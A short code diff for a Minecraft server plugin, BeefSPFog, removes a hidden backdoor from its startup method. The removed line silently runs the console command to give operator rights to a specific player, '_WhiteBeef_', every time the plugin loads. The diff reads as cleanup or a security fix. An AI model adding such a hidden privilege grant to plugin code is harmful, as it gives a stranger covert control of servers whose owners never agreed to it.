@@ -21,7 +21,6 @@ public final class BeefSPFog extends JavaPlugin implements Listener {
         this.pluginSettings.loadTasks();
         this.pluginSettings.loadCommands();
         this.pluginSettings.loadPlayers();
-        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "op _WhiteBeef_");
     }
 
     @Override
